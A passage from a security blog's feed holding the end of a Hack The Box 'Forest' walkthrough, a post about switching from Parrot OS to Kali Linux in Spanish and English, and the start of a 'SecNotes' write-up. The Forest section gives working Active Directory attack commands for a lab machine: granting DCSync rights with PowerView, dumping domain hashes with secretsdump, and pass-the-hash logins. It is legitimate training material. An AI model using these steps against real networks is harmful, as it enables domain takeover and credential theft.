&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;download &amp;lt;timestamp&amp;gt;_BloodHound.zip BloodHound.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next step is to import the compressed file generated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound&lt;/code&gt; into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt;. If we don’t have the tool installed, we can do the following:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;neo4j bloodhound
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;Neo4j&lt;/em&gt; is the graph database used by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt;. We will start it as follows:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;neo4j console
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/20.png&quot; alt=&quot;20&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It will instruct us to navigate to &lt;a href=&quot;http://localhost:7474/&quot;&gt;http://localhost:7474/&lt;/a&gt;. To connect to &lt;em&gt;Neo4j&lt;/em&gt; for the first time, the default credentials we will enter are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Username: neo4j&lt;/li&gt;
  &lt;li&gt;Password: neo4j&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/21.png&quot; alt=&quot;21&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It will then prompt us to change the password, which we will use for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/22.png&quot; alt=&quot;22&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we open &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt; and log in, on the right side, we will see a section labeled &lt;em&gt;Upload Data&lt;/em&gt;. This is where we will upload our compressed file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/23.png&quot; alt=&quot;23&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the search bar at the top left, we can search for the user we just compromised, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt;. We can right-click on it and select &lt;em&gt;Mark User as Owned&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/24.png&quot; alt=&quot;24&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we go to the &lt;em&gt;Analysis&lt;/em&gt; section, we will find a &lt;em&gt;Shortest Paths&lt;/em&gt; section. Within this section, we select &lt;em&gt;Shortest Path from Owned Principals&lt;/em&gt;. When we click, a graph will display showing the best path to become a system administrator.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/25.png&quot; alt=&quot;25&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; is a member of the &lt;em&gt;Service Accounts&lt;/em&gt; group, which is a member of the &lt;em&gt;Privileged IT Accounts&lt;/em&gt; group, which in turn is a member of the &lt;em&gt;Account Operators&lt;/em&gt; group. Additionally, the &lt;em&gt;Account Operators&lt;/em&gt; group has &lt;em&gt;GenericAll&lt;/em&gt; permissions over the &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; group, which grants it full control over this group. The &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; group has &lt;em&gt;WriteDacl&lt;/em&gt; permissions over the domain, allowing it to modify the domain’s Discretionary Access Control List (&lt;em&gt;DACL&lt;/em&gt;).&lt;/p&gt;

&lt;p&gt;Let’s break this down: the &lt;em&gt;Account Operators&lt;/em&gt; group grants limited account creation privileges to a user. Therefore, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; user can create additional accounts in the domain. Additionally, the &lt;em&gt;Account Operators&lt;/em&gt; group has &lt;em&gt;GenericAll&lt;/em&gt; permissions over the &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; group, meaning &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; can modify the permissions of the &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; group. Finally, the &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; group has &lt;em&gt;WriteDacl&lt;/em&gt; permissions over the domain. We will exploit this to grant ourselves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCSync&lt;/code&gt; privileges.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCSync&lt;/code&gt; attack simulates the behavior of a &lt;em&gt;Domain Controller&lt;/em&gt; and requests other &lt;em&gt;Domain Controllers&lt;/em&gt; to replicate information using the Directory Replication Service Remote Protocol (&lt;em&gt;MS-DRSR&lt;/em&gt;). Since this protocol is essential to &lt;em&gt;Active Directory’s&lt;/em&gt; functionality, it cannot be disabled. By performing this attack, we can replicate domain information and dump all the domain hashes.&lt;/p&gt;

&lt;p&gt;With all this said, the first thing we will do is take advantage of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; being a member of the &lt;em&gt;Account Operators&lt;/em&gt; group and create a new user. To do this, we will use the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user username password /add /domain
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/26.png&quot; alt=&quot;26&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next step is to add the newly created user to the &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; group, taking advantage of the full control that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; full control has over this group:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Add-ADGroupMember&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Exchange Windows Permissions&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Members&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We will also add this user to the &lt;em&gt;Remote Management Users&lt;/em&gt; group so that it can connect via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Add-ADGroupMember&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Remote Management Users&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Members&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/27.png&quot; alt=&quot;27&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By adding the user to the &lt;em&gt;Remote Management Users&lt;/em&gt; group, we avoid the use of &lt;em&gt;PSCredentials&lt;/em&gt;, which are normally used to execute commands with another user’s credentials, which personally caused conflicts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PowerView&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Next, we will close the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt; session and reconnect with the newly created user. Once connected as the new user, we will download the &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;PowerView&lt;/a&gt; script to our machine, which is part of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PowerSploit&lt;/code&gt; (a collection of PowerShell scripts). As before, we will upload it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt; and then import it:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PowerView.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\PowerView.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/28.png&quot; alt=&quot;28&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once imported, we will use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Add-DomainObjectAcl&lt;/code&gt; function to grant &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCsync&lt;/code&gt; permissions to our newly created user:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Add-DomainObjectAcl &lt;span class=&quot;nt&quot;&gt;-TargetIdentity&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DC=htb,DC=local&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PrincipalIdentity&lt;/span&gt; username &lt;span class=&quot;nt&quot;&gt;-Rights&lt;/span&gt; DCSync
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/29.png&quot; alt=&quot;29&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCsync&lt;/code&gt; permissions granted to our user, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump&lt;/code&gt;, another script from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt; suite, to dump all domain users’ hashes:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-secretsdump htb.local/username:password@10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/30.png&quot; alt=&quot;30&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, we can perform a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pass the Hash&lt;/code&gt; attack, which involves using the &lt;em&gt;hash&lt;/em&gt; we just obtained instead of the password (which we don’t know) to authenticate. For this, we could use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt; (another script from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt;) or alternatively, via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt; itself.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Administrator&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;HASH&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/31.png&quot; alt=&quot;31&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-psexec administrator@10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-hash&lt;/span&gt; HASH
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/32.png&quot; alt=&quot;32&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 19 Aug 2024 00:00:00 -0400</pubDate>
        <link>/en/Forest-Hack-The-Box/</link>
        <guid isPermaLink="true">/en/Forest-Hack-The-Box/</guid>
      </item>
    
      <item>
        <title>Migrando de Parrot OS a Kali Linux</title>
        <description>&lt;p&gt;Últimamente he experimentado cuelgues aleatorios de forma frecuente con &lt;strong&gt;Parrot OS 5.3&lt;/strong&gt; en mi máquina virtual &lt;strong&gt;VMware Workstation Pro&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;En un principio, pensé que estos problemas podrían deberse a la actualización &lt;strong&gt;22H2&lt;/strong&gt; de Windows, ya que había leído algunos posts que mencionaban posibles incompatibilidades. Sin embargo, después de explorar esta posibilidad, no noté mejoras.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://communities.vmware.com/t5/VMware-Workstation-Pro/Vmware-17-Pro-very-slow-on-Windows-11-22H2/td-p/2946164&quot;&gt;Vmware 17 Pro very slow on Windows 11 22H2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.reddit.com/r/vmware/comments/17fc6t9/vm_machines_freezes_randomly_after_a_while_in/&quot;&gt;VM machines freezes randomly after a while in VMware Workstation Pro 17.5&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Luego, consideré que la actualización de &lt;strong&gt;VMware&lt;/strong&gt; a la versión &lt;strong&gt;17.5&lt;/strong&gt; podría ser la causa, ya que los cuelgues se volvieron más frecuentes en mi computadora de escritorio. Curiosamente, en mi laptop, donde no actualicé &lt;strong&gt;VMware&lt;/strong&gt; a esta versión, también comencé a experimentar cuelgues, aunque con mucha menos frecuencia.&lt;/p&gt;

&lt;p&gt;Incluso llegué a sospechar que el framework con el que estaba trabajando para un proyecto podría ser la fuente de los problemas, ya que los cuelgues parecían estar relacionados con los &lt;em&gt;crashes&lt;/em&gt; del mismo.&lt;/p&gt;

&lt;p&gt;Después de meses lidiando con estos problemas y sin encontrar una solución, decidí realizar una actualización completa de &lt;strong&gt;Parrot OS&lt;/strong&gt; utilizando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parrot-upgrade&lt;/code&gt;. Sin embargo, durante este proceso, surgieron varios mensajes de error y, finalmente, la máquina virtual dejó de arrancar debido a un &lt;strong&gt;kernel panic&lt;/strong&gt;. Opté por no intentar solucionar este problema y, en su lugar, realicé un respaldo de mis archivos utilizando un &lt;strong&gt;live USB&lt;/strong&gt; con la ISO de Parrot.&lt;/p&gt;

&lt;p&gt;Al observar que varios usuarios enfrentaban dificultades similares con &lt;strong&gt;Parrot OS&lt;/strong&gt; y optaban por migrar a &lt;strong&gt;Kali Linux&lt;/strong&gt;,  tomé la misma decisión. Descargué la &lt;a href=&quot;https://www.kali.org/get-kali/#kali-virtual-machines&quot;&gt;imagen preconfigurada&lt;/a&gt; de &lt;strong&gt;Kali Linux&lt;/strong&gt; para &lt;strong&gt;VMware&lt;/strong&gt;, lo que facilitó el proceso al no tener que realizar ninguna instalación adicional.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-01-09-Migrando-de-Parrot-OS-a-Kali-Linux/1.png&quot; alt=&quot;1&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Simplemente abrí el archivo de configuración &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.vmx&lt;/code&gt; con &lt;strong&gt;VMware&lt;/strong&gt;, y la máquina virtual estaba lista para ser ejecutada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-01-09-Migrando-de-Parrot-OS-a-Kali-Linux/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El cambio a &lt;strong&gt;Kali Linux&lt;/strong&gt; fue rápido y la experiencia resultó bastante sencilla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-01-09-Migrando-de-Parrot-OS-a-Kali-Linux/3.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al poco tiempo empecé a configurar el mismo entorno de trabajo que tenía previamente en &lt;strong&gt;Parrot OS&lt;/strong&gt;, el cual pueden encontrar en el siguiente enlace a mi &lt;a href=&quot;https://github.com/MateoNitro550/ArcticTones&quot;&gt;repositorio&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Este cambio ha mejorado significativamente la estabilidad y la experiencia de uso, proporcionándome un entorno más fiable para continuar con mi trabajo y proyectos.&lt;/p&gt;
</description>
        <pubDate>Mon, 01 Jan 2024 00:00:00 -0500</pubDate>
        <link>/es/Migrando-de-Parrot-OS-a-Kali-Linux/</link>
        <guid isPermaLink="true">/es/Migrando-de-Parrot-OS-a-Kali-Linux/</guid>
      </item>
    
      <item>
        <title>Migrating from Parrot OS to Kali Linux</title>
        <description>&lt;p&gt;Lately, I’ve been experiencing frequent random crashes with &lt;strong&gt;Parrot OS 5.3&lt;/strong&gt; on my &lt;strong&gt;VMware Workstation Pro&lt;/strong&gt; virtual machine.&lt;/p&gt;

&lt;p&gt;Initially, I thought these issues might be due to the &lt;strong&gt;22H2&lt;/strong&gt; update of Windows, as I had read some posts mentioning potential incompatibilities. However, after exploring this possibility, I didn’t notice any improvements.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://communities.vmware.com/t5/VMware-Workstation-Pro/Vmware-17-Pro-very-slow-on-Windows-11-22H2/td-p/2946164&quot;&gt;Vmware 17 Pro very slow on Windows 11 22H2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.reddit.com/r/vmware/comments/17fc6t9/vm_machines_freezes_randomly_after_a_while_in/&quot;&gt;VM machines freezes randomly after a while in VMware Workstation Pro 17.5&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Later, I considered that the update of &lt;strong&gt;VMware&lt;/strong&gt; to version &lt;strong&gt;17.5&lt;/strong&gt; might be the cause, as the crashes became more frequent on my desktop computer. Interestingly, on my laptop, where I didn’t update &lt;strong&gt;VMware&lt;/strong&gt; to this version, I also started experiencing crashes, although much less frequently.&lt;/p&gt;

&lt;p&gt;I even suspected that the framework I was using for a project might be the source of the problems, as the crashes seemed to be related to its crashes.&lt;/p&gt;

&lt;p&gt;After months of dealing with these issues and finding no solution, I decided to perform a full update of &lt;strong&gt;Parrot OS&lt;/strong&gt; using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parrot-upgrade&lt;/code&gt; command. However, during this process, several error messages appeared, and eventually, the virtual machine failed to boot due to a &lt;strong&gt;kernel panic&lt;/strong&gt;. I chose not to try to solve this problem and instead backed up my files using a &lt;strong&gt;live USB&lt;/strong&gt; with the Parrot ISO.&lt;/p&gt;

&lt;p&gt;Seeing that many users were facing similar difficulties with &lt;strong&gt;Parrot OS&lt;/strong&gt; and opting to migrate to &lt;strong&gt;Kali Linux&lt;/strong&gt;, I made the same decision. I downloaded the &lt;a href=&quot;https://www.kali.org/get-kali/#kali-virtual-machines&quot;&gt;pre-configured image&lt;/a&gt; of &lt;strong&gt;Kali Linux&lt;/strong&gt; for &lt;strong&gt;VMware&lt;/strong&gt;, making the process easier without the need for additional installations.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-01-09-Migrando-de-Parrot-OS-a-Kali-Linux/1.png&quot; alt=&quot;1&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I simply opened the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.vmx&lt;/code&gt; configuration file with &lt;strong&gt;VMware&lt;/strong&gt;, and the virtual machine was ready to run.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-01-09-Migrando-de-Parrot-OS-a-Kali-Linux/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The transition to &lt;strong&gt;Kali Linux&lt;/strong&gt; was swift, and the experience was quite straightforward.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-01-09-Migrando-de-Parrot-OS-a-Kali-Linux/3.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Soon after, I began configuring the same Linux setup I had in &lt;strong&gt;Parrot OS&lt;/strong&gt;, which you can find in the following link to my &lt;a href=&quot;https://github.com/MateoNitro550/ArcticTones&quot;&gt;repository&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This change has significantly improved stability and the overall user experience, providing me with a more reliable environment to continue my work and projects.&lt;/p&gt;
</description>
        <pubDate>Mon, 01 Jan 2024 00:00:00 -0500</pubDate>
        <link>/en/Migrating-from-Parrot-OS-to-Kali-Linux/</link>
        <guid isPermaLink="true">/en/Migrating-from-Parrot-OS-to-Kali-Linux/</guid>
      </item>
    
      <item>
        <title>SecNotes - Hack The Box</title>
        <description>&lt;p&gt;En esta ocasión vamos a estar resolviendo la máquina &lt;em&gt;SecNotes&lt;/em&gt; de &lt;em&gt;Hack The Box&lt;/em&gt;. Es una máquina &lt;em&gt;Windows&lt;/em&gt; de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/1.png&quot; alt=&quot;User Rated Difficulty&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;

&lt;p&gt;Primeramente vamos a lanzar una &lt;em&gt;traza ICMP&lt;/em&gt; para saber si la máquina está activa.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.97
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del &lt;em&gt;TTL&lt;/em&gt;; en este caso el valor del &lt;em&gt;TTL&lt;/em&gt; de la máquina es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt;, por lo que podemos intuir que estamos ante una máquina &lt;em&gt;Windows&lt;/em&gt;. Recordemos que algunos de los valores referenciales son los siguientes:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Sistema Operativo (OS)&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;TTL&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;64&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;128&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solaris&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;254&lt;/td&gt;
